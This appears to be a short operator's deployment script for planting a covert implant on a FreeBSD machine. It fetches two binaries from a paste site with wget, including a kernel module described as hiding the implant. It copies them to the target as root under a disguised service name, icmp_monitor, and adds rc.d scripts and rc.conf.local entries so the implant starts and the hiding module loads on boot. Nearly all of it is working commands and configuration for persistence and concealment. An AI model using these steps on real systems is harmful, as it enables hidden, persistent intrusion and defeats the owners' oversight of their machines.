# we're running a weird build of son that lets me set the interface
wget paste.c-net.org/SeasonsJennings
mv SeasonsJennings son_debug

# and a build of dad intended to hide icmp_monitor
wget paste.c-net.org/HallwayZephyr
mv HallwayZephyr dad.ko

scp son_debug root@X:/sbin/icmp_monitor
scp dad.ko root@X:/boot/kernel/dad.ko
scp icmp_monitor root@X:/usr/local/etc/rc.d/icmp_monitor
scp icmp_launch.sh root@X:/usr/local/etc/rc.d/icmp_launch.sh
scp rc.conf.local root@X:/etc/rc.conf.local


### icmp_monitor
#!/bin/sh

# PROVIDE: icmp_monitor

. /etc/rc.subr

name="icmp_monitor"
rcvar="${name}_enable"
start_cmd="${name}_start"
stop_cmd="${name}_stop"
status_cmd="echo 'icmp_monitor running'"

icmp_monitor_start() {
	echo "icmp_monitor starting"
	/sbin/icmp_monitor vmx1 &
}

icmp_monitor_stop() {
	echo "icmp_monitor stopping"
}
load_rc_config $name
run_rc_command $1



### icmp_launch.sh
#!/bin/sh
/usr/local/etc/rc.d/icmp_monitor onestart


### rc.conf.local
icmp_monitor_enable="YES"
kld_list="dad"
